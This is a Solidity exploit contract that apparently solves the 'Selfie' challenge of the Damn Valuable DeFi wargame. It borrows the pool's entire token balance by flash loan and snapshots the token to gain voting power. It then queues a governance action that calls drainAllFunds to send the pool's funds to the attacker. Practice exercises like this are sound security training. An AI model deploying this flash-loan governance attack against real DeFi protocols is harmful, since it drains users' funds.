// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "hardhat/console.sol";

contract AttackTheSelfiePool {

    address public selfiePool;
    address public liquidityToken;
    address public simpleGovernance;
    address public attacker_owner;

    uint256 actionId;


    constructor(address _selfiePool, address _damnValuableTokenSnapshot, address _simpleGovernance) {
        selfiePool = _selfiePool;
        liquidityToken = _damnValuableTokenSnapshot;
        simpleGovernance = _simpleGovernance;
        attacker_owner = msg.sender;
    }

    function attackTheSelfiePool() public {
        uint256 borrowAmount = DamnValuableTokenSnapshot(liquidityToken).balanceOf(address(selfiePool));
        SelfiePool(selfiePool).flashLoan(borrowAmount);
        
    }

    function receiveTokens(address token,uint256 borrowAmount) public {
        DamnValuableTokenSnapshot(liquidityToken).snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", tx.origin);
        actionId = SimpleGovernance(simpleGovernance).queueAction(selfiePool, data, 0);
        DamnValuableTokenSnapshot(liquidityToken).transfer(msg.sender, borrowAmount);
        //SimpleGovernance(simpleGovernance).executeAction(actionId);
    }

    function executeAction_governance() public payable{
        SimpleGovernance(simpleGovernance).executeAction(actionId);
    }
    
    
}